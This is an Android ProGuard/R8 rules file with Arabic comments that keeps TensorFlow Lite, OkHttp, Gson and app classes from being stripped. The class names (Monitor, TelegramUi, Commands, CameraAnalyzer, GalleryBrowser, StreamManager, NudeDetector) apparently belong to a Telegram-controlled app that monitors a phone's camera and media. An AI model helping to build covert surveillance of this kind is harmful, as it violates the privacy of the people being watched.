# ============================================================
#  قواعد ProGuard/R8 لحماية الكلاسات المهمة من الإزالة أو التغيير
#  لمنع أخطاء وقت التشغيل (Runtime Errors)
# ============================================================

# ----- الحفاظ على جميع كلاسات التطبيق الرئيسية -----
-keep class com.example.app.** { *; }
-keep class com.example.app.**$* { *; }

# ----- الحفاظ على كلاسات الانعكاس (Reflection) المستخدمة في الكود -----
-keep class java.lang.reflect.** { *; }

# ----- الحفاظ على كلاسات TensorFlow Lite (مع دعم الانعكاس وتسريع الأجهزة) -----
-keep class org.tensorflow.lite.** { *; }
-keep class org.tensorflow.lite.support.** { *; }
-keep class org.tensorflow.lite.nnapi.** { *; }      # دعم NNAPI
-keep class org.tensorflow.lite.gpu.** { *; }        # دعم GPU
-keep class org.tensorflow.lite.xnnpack.** { *; }    # دعم XNNPACK (اختياري)

# ✅ إضافة قواعد إضافية لحماية TensorFlow Lite من الإزالة
-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Tensor$* { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-keep class org.tensorflow.lite.DelegateFactory { *; }
-keep class org.tensorflow.lite.nnapi.NnApiDelegate { *; }
-keep class org.tensorflow.lite.gpu.GpuDelegate { *; }

# منع التحذيرات من TensorFlow Lite (لأنها تستخدم الانعكاس)
-dontwarn org.tensorflow.lite.**

# ----- الحفاظ على كلاسات OkHttp (الشبكات) -----
-keep class okhttp3.** { *; }
-keep class okhttp3.logging.** { *; }
-keep interface okhttp3.** { *; }

# ----- الحفاظ على كلاسات org.json (تحليل JSON) -----
-keep class org.json.** { *; }

# ----- الحفاظ على كلاسات التشفير الأساسية (Java Cryptography) -----
-keep class javax.crypto.** { *; }

# ----- الحفاظ على كلاسات Kotlin الأساسية (لضمان عمل الانعكاس بشكل صحيح) -----
-keep class kotlin.** { *; }
-keep class kotlinx.coroutines.** { *; }

# ----- الحفاظ على كلاسات تستخدم في التسلسل (Serialization) -----
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ----- الحفاظ على Annotation المستخدمة في الانعكاس -----
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod

# ✅ الحفاظ على السمات الإضافية المطلوبة للانعكاس وتصحيح الأخطاء
-keepattributes Exceptions
-keepattributes LineNumberTable

# ----- منع إزالة الكلاسات المستخدمة في الإنشاء الديناميكي (Dynamic Instantiation) -----
-keepclasseswithmembers class * {
    public <init>(...);
}

# ----- الحفاظ على جميع الحقول والدوال التي قد تُستخدم عن طريق الانعكاس -----
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

# ============================================================
#  ✅ حماية دوال الانعكاس (Reflection) الحيوية (العامة والخاصة)
# ============================================================

# حماية جميع الدوال (العامة والخاصة) في كل الكلاسات التي تستخدم الانعكاس
-keepclassmembers class com.example.app.Monitor {
    public *;
    private *;
}
-keepclassmembers class com.example.app.TelegramUi {
    public *;
    private *;
}
-keepclassmembers class com.example.app.Commands {
    public *;
    private *;
}
-keepclassmembers class com.example.app.DailyZipper {
    public *;
    private *;
}
-keepclassmembers class com.example.app.CameraAnalyzer {
    public *;
    private *;
}
-keepclassmembers class com.example.app.GalleryBrowser {
    public *;
    private *;
}
-keepclassmembers class com.example.app.MediaScanner {
    public *;
    private *;
}
-keepclassmembers class com.example.app.StreamManager {
    public *;
    private *;
}
-keepclassmembers class com.example.app.NudeDetector {
    public *;
    private *;
}
-keepclassmembers class com.example.app.SecurityHelper {
    public *;
    private *;
}
-keepclassmembers class com.example.app.ConfigLoader {
    public *;
    private *;
}
-keepclassmembers class com.example.app.FileDownloader {
    public *;
    private *;
}
-keepclassmembers class com.example.app.ForegroundService {
    public *;
    private *;
}

# ============================================================
#  منع إزالة كلاسات Log (إذا تم استخدامها)
# ============================================================
-keep class android.util.Log { *; }

# ============================================================
#  منع تحسينات R8 التي قد تعطل استخدام بعض المكتبات
# ============================================================
-dontwarn okhttp3.**
-dontwarn org.json.**
-dontwarn javax.**
-dontwarn kotlin.**

# ============================================================
#  احتفظ بأسماء الدوال في حال استخدام الانعكاس بالاسم
# ============================================================
-keepnames class * {
    public *;
}

# ============================================================
#  إضافات خاصة لحل مشكلة R8 (الفئات المفقودة من Google APIs)
# ============================================================
-dontwarn com.google.api.client.**
-dontwarn com.google.crypto.tink.**

# ============================================================
#  إضافات إضافية لتحسين التوافق والأمان
# ============================================================

# الحفاظ على كلاسات Gson (لأنها تستخدم الانعكاس)
-keep class com.google.gson.** { *; }
-keep class com.google.gson.stream.** { *; }

# الحفاظ على كلاسات Okio (إذا تم استخدامها مع OkHttp)
-keep class okio.** { *; }

# الحفاظ على كلاسات الأمان (SecurityHelper) التي تستخدم Keystore و Cipher
-keep class javax.crypto.spec.** { *; }
-keep class android.security.keystore.** { *; }

# منع إزالة أي دالة أو حقل يحتوي على اسم "serialVersionUID" (للتسلسل)
-keepclassmembers class * {
    private static final long serialVersionUID;
}

# ============================================================
#  نهاية القواعد
# ============================================================
